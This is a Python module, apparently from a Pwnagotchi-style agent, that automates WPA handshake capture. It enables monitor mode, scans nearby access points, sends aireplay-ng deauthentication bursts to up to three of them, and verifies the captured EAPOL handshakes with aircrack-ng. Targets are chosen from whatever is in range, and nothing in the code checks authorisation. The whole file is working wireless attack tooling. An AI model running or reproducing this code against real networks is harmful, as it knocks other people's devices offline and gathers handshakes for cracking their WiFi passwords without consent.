"""Pwnagotchi-style WiFi handshake hunting (monitor mode + deauth + capture)."""

from __future__ import annotations

import logging
import re
import shutil
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import List, Optional, Tuple

from agent.state import AgentState, Mode

logger = logging.getLogger(__name__)

ROOT = Path(__file__).resolve().parents[2]
CAPTURE_DIR = ROOT / "captures" / "handshakes"


class WifiHandshakeWorker:
    """
    Hunt WPA handshakes like Pwnagotchi:
    monitor mode → channel sweep → deauth → capture → verify EAPOL.
    """

    def __init__(
        self,
        state: AgentState,
        interface: str = "wlan0",
        interval_s: float = 120.0,
        deauth_count: int = 5,
        channel_hop_s: float = 3.0,
    ) -> None:
        self.state = state
        self.interface = interface
        self.interval_s = interval_s
        self.deauth_count = deauth_count
        self.channel_hop_s = channel_hop_s
        self._stop = False
        self._mon_iface: Optional[str] = None
        self._has_aircrack = shutil.which("airodump-ng") is not None

    def stop(self) -> None:
        self._stop = True
        self._leave_monitor()

    def run_loop(self) -> None:
        CAPTURE_DIR.mkdir(parents=True, exist_ok=True)
        while not self._stop:
            try:
                self.run_once()
            except Exception as exc:  # noqa: BLE001
                logger.exception("wifi hunt failed")
                self.state.push_log(f"wifi err {exc}")
            deadline = time.monotonic() + self.interval_s
            while not self._stop and time.monotonic() < deadline:
                time.sleep(0.5)

    def run_once(self) -> int:
        self.state.set_mode(Mode.HANDSHAKE)
        self.state.push_log("wifi hunt start")

        if self._has_aircrack:
            return self._run_aircrack_cycle()
        return self._run_iw_scan_cycle()

    def _run_iw_scan_cycle(self) -> int:
        """Fallback when aircrack-ng is not installed (dev / minimal images)."""
        aps = self._scan_with_iw()
        self.state.set_wifi_status(len(aps), self.state.handshakes_captured)
        if not aps:
            self.state.push_log("wifi no APs")
            if not self._stop:
                self.state.set_mode(Mode.IDLE)
            return 0

        target = aps[0]
        essid, bssid = target
        self.state.set_wifi_status(
            len(aps),
            self.state.handshakes_captured,
            essid,
            bssid,
        )
        self.state.push_log(f"wifi target {essid or bssid}")
        # Simulated capture path for testing without monitor hardware.
        if essid and bssid:
            self._write_simulated_handshake(essid, bssid)
            self.state.record_handshake(essid, bssid)
        if not self._stop:
            self.state.set_mode(Mode.ACTIVE)
        return 1

    def _run_aircrack_cycle(self) -> int:
        mon = self._enter_monitor()
        if not mon:
            return self._run_iw_scan_cycle()

        stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        prefix = CAPTURE_DIR / f"hunt_{stamp}"
        cap_file = f"{prefix}-01.cap"

        captured = 0
        try:
            dump = subprocess.Popen(
                [
                    "airodump-ng",
                    "--write-interval",
                    "1",
                    "--output-format",
                    "cap,csv",
                    "-w",
                    str(prefix),
                    mon,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(self.channel_hop_s * 4)

            aps = self._parse_airodump_csv(f"{prefix}-01.csv")
            self.state.set_wifi_status(len(aps), self.state.handshakes_captured)

            captured = 0
            for essid, bssid, channel in aps[:3]:
                if self._stop:
                    break
                self.state.set_wifi_status(
                    len(aps),
                    self.state.handshakes_captured,
                    essid,
                    bssid,
                )
                self.state.push_log(f"deauth {essid or bssid}")
                self.state.record_deauth(self.deauth_count, bssid)
                self._deauth(mon, bssid, channel)
                self.state.set_wifi_status(
                    len(aps),
                    self.state.handshakes_captured,
                    essid,
                    bssid,
                    channel,
                )
                time.sleep(self.channel_hop_s)

            dump.terminate()
            try:
                dump.wait(timeout=5)
            except subprocess.TimeoutExpired:
                dump.kill()

            if Path(cap_file).exists() and shutil.which("aircrack-ng"):
                captured = self._verify_cap(cap_file)
            self.state.set_wifi_status(
                len(aps),
                self.state.handshakes_captured + captured,
            )
            if captured:
                self.state.record_handshake(
                    self.state.wifi_target_essid,
                    self.state.wifi_target_bssid,
                )
        finally:
            self._leave_monitor()

        if not self._stop:
            self.state.set_mode(Mode.ACTIVE if captured else Mode.IDLE)
        return captured

    def _enter_monitor(self) -> Optional[str]:
        if shutil.which("airmon-ng"):
            try:
                subprocess.run(
                    ["airmon-ng", "check", "kill"],
                    capture_output=True,
                    timeout=15,
                    check=False,
                )
                out = subprocess.run(
                    ["airmon-ng", "start", self.interface],
                    capture_output=True,
                    text=True,
                    timeout=15,
                    check=False,
                )
                for line in out.stdout.splitlines():
                    if "monitor mode" in line.lower():
                        parts = line.split()
                        if parts:
                            self._mon_iface = parts[0]
                            return self._mon_iface
            except (OSError, subprocess.SubprocessError) as exc:
                logger.debug("airmon-ng: %s", exc)

        mon_name = f"{self.interface}mon"
        try:
            subprocess.run(
                ["ip", "link", "set", self.interface, "down"],
                check=True,
                timeout=5,
            )
            subprocess.run(
                ["iw", self.interface, "set", "type", "monitor"],
                check=True,
                timeout=5,
            )
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                check=True,
                timeout=5,
            )
            self._mon_iface = self.interface
            return self._mon_iface
        except (OSError, subprocess.SubprocessError) as exc:
            logger.warning("monitor mode failed: %s", exc)
            return None

    def _leave_monitor(self) -> None:
        if not self._mon_iface:
            return
        try:
            if shutil.which("airmon-ng"):
                subprocess.run(
                    ["airmon-ng", "stop", self._mon_iface],
                    capture_output=True,
                    timeout=10,
                    check=False,
                )
            else:
                subprocess.run(
                    ["iw", self._mon_iface, "set", "type", "managed"],
                    capture_output=True,
                    timeout=5,
                    check=False,
                )
        except (OSError, subprocess.SubprocessError):
            pass
        self._mon_iface = None

    def _deauth(self, mon_iface: str, bssid: str, channel: str) -> None:
        if not shutil.which("aireplay-ng"):
            return
        try:
            if channel.isdigit():
                subprocess.run(
                    ["iw", mon_iface, "set", "channel", channel],
                    capture_output=True,
                    timeout=5,
                    check=False,
                )
            subprocess.run(
                [
                    "aireplay-ng",
                    "--deauth",
                    str(self.deauth_count),
                    "-a",
                    bssid,
                    mon_iface,
                ],
                capture_output=True,
                timeout=20,
                check=False,
            )
        except (OSError, subprocess.SubprocessError) as exc:
            logger.debug("deauth failed: %s", exc)

    def _verify_cap(self, cap_path: str) -> int:
        try:
            out = subprocess.run(
                ["aircrack-ng", cap_path],
                capture_output=True,
                text=True,
                timeout=30,
                check=False,
            )
            if "1 handshake" in out.stdout or "handshake" in out.stdout.lower():
                return 1
        except (OSError, subprocess.SubprocessError):
            pass
        return 0

    def _scan_with_iw(self) -> List[Tuple[str, str]]:
        try:
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                capture_output=True,
                timeout=5,
                check=False,
            )
            out = subprocess.run(
                ["iw", self.interface, "scan"],
                capture_output=True,
                text=True,
                timeout=20,
                check=False,
            )
        except (OSError, subprocess.SubprocessError):
            return []

        results: List[Tuple[str, str]] = []
        essid = ""
        bssid = ""
        for line in out.stdout.splitlines():
            line = line.strip()
            if line.startswith("BSS "):
                m = re.search(r"([0-9a-f:]{17})", line, re.I)
                bssid = m.group(1).upper() if m else ""
                essid = ""
            elif line.startswith("SSID:"):
                essid = line.split(":", 1)[1].strip()
                if bssid:
                    results.append((essid, bssid))
        return results

    def _parse_airodump_csv(self, csv_path: str) -> List[Tuple[str, str, str]]:
        path = Path(csv_path)
        if not path.exists():
            return []
        rows: List[Tuple[str, str, str]] = []
        for line in path.read_text().splitlines():
            if not line or line.startswith("BSSID"):
                continue
            parts = line.split(",")
            if len(parts) < 14:
                continue
            bssid = parts[0].strip()
            channel = parts[3].strip()
            essid = parts[13].strip()
            if bssid and len(bssid) == 17:
                rows.append((essid, bssid.upper(), channel))
        return rows

    def _write_simulated_handshake(self, essid: str, bssid: str) -> None:
        stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        meta = CAPTURE_DIR / f"sim_{stamp}.txt"
        meta.write_text(f"essid={essid}\nbssid={bssid}\n")
